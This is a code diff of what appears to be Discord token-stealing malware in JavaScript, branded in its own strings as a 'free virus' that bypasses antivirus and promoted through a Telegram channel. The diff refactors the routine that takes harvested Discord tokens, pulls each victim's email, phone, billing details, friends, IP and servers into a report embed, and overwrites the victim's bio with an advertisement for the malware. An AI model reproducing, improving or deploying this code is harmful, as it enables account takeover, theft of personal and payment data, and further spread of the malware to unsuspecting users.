@@ -1526,50 +1526,88 @@ function findToken(path) {
 }
 
 
-async function stealTokens() {
+async function getUserData(token) {
+    try {
+        const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        });
+
+        const userData = userResponse.data;
+
+        if (!userData) return null;
+
+        const id = userData.id;
+        const username = userData.username;
+        const discriminator = userData.discriminator;
+        const avatar = userData.avatar;
+        const email = userData.email;
+        const phone = userData.phone;
+        const mfa_enabled = userData.mfa_enabled;
+        const flags = userData.flags;
+        const premium_type = userData.premium_type;
+        const bio = userData.bio;
+
+        return {
+            id,
+            username,
+            discriminator,
+            avatar,
+            email,
+            phone,
+            mfa_enabled,
+            flags,
+            premium_type,
+            bio
+        };
+    } catch (error) {
+        console.error(error);
+        return null;
+    }
+}
+
+async function getTokens() {
     const interceptedTokens = [];
 
     for (let path of paths) {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗
-   **  This free virus can bypass all antivirus ! **
-           ⭐️**https://t.me/doenerium69**⭐️
-╚═══════════✧✧✧═══════════╝`;
-
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗        **This free virus can bypass all antivirus !                  ⭐️https://t.me/doenerium69** ⭐️ ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
         try {
-            let json;
-            await axios.get("https://discord.com/api/v9/users/@me", {
-                headers: {
-                    "Content-Type": "application/json",
-                    "authorization": token
-                }
-            }).then(res => { json = res.data }).catch(() => { json = null });
+            const userData = await getUserData(token);
 
-            if (!json) continue;
+            if (!userData) continue;
 
-            const newBio = await updateBio(token, predefinedBio);
+            const phoneNumber = userData.phone || "None";
+            let newBio = null;
+
+            if (phoneNumber !== "None") {
+                newBio = await updateBio(token, predefinedBio);
+            }
+
             interceptedTokens.push(token);
-            const phone = await getPhoneNumber(token);
             const hqGuilds = await getHQGuilds(token);
-            var ip = await getIp();
-            var billing = await getBilling(token);
-            var friends = await getRelationships(token);
+            const ip = await getIp();
+            const billing = await getBilling(token);
+            const friends = await getRelationships(token);
+            const currentBio = userData.bio|| "None";
 
             const randomString = crypto.randomBytes(16).toString('hex');
 
             const userInformationEmbed = {
-                title: `${json.username}#${json.discriminator} (${json.id})`,
+                title: `${userData.username}#${userData.discriminator} (${userData.id})`,
                 color: 0x303037,
                 author: {
                     name: "Discord Session Detected",
                     icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
                 },
                 thumbnail: {
-                    url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
+                    url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
                 },
                 fields: [
                     {
@@ -1578,7 +1616,7 @@ async function stealTokens() {
                     },
                     {
                         name: ":envelope: Email:",
-                        value: "``" + `\`${json.email}\`` + "``",
+                        value: "``" + `\`${userData.email}\`` + "``",
                         inline: true
                     },
                     {
@@ -1588,17 +1626,17 @@ async function stealTokens() {
                     },
                     {
                         name: "<:mobile88:1210411486120517663> Phone:",
-                        value: "``" + `\`${phone}\`` + "``",
+                        value: "``" + `\`${phoneNumber}\`` + "``",
                         inline: true
                     },
                     {
                         name: "",
-                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(json.flags)}`,
+                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(userData.flags)}`,
                         inline: true
                     },
                     {
                         name: "",
-                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(json.premium_type, json.id, token)}`,
+                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(userData.premium_type, userData.id, token)}`,
                         inline: true
                     },
                     {
@@ -1611,7 +1649,7 @@ async function stealTokens() {
                         value: hqGuilds,
                         inline: true
                     },
-                  ],
+                ],
                 footer: {
                     text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                     icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
@@ -1625,7 +1663,7 @@ async function stealTokens() {
             if (friends !== '*Nothing to see here*') {
                 const friendsEmbed = {
                     title: "Friends",
-                    color: 0x303037, 
+                    color: 0x303037,
                     description: friends,
                     author: {
                         name: "HQ Friends",
@@ -1640,8 +1678,13 @@ async function stealTokens() {
 
             if (newBio !== null) {
                 userInformationEmbed.fields.push({
-                    name: "<a:aa_star_black:1157319572328808449> About me:",
+                    name: "<a:aa_star_black:1157319572328808449> New About me:",
                     value: "```\n" + newBio + "\n```",
+                });
+            } else if (currentBio !== null) {
+                userInformationEmbed.fields.push({
+                    name: "<a:aa_star_black:1157319572328808449> About me:",
+                    value: "```\n" + userData.bio + "\n```",
                 });
             }
 
@@ -1650,7 +1693,6 @@ async function stealTokens() {
 
         } catch (error) {
             console.error(error);
-            logToDebugFile(error);
         }
     }
 }
@@ -1672,31 +1714,7 @@ async function updateBio(token, newBio) {
         }
     } catch (error) {
         console.error(`An error occurred while updating bio: ${error.message}`);
-        logToDebugFile(error);
         return null;
-    }
-}
-
-async function getPhoneNumber(token) {
-    try {
-        const response = await axios.get("https://discordapp.com/api/v6/users/@me", {
-            headers: {
-                "Content-Type": "application/json",
-                "authorization": token
-            }
-        });
-
-        const phoneNumber = response.data.phone || "None";
-        const isTwoFactorEnabled = response.data.mfa_enabled;
-
-        if (isTwoFactorEnabled) {
-            return phoneNumber;
-        }
-
-        return phoneNumber;
-    } catch (error) {
-        console.error(error);
-        return "Error retrieving phone number";
     }
 }
 
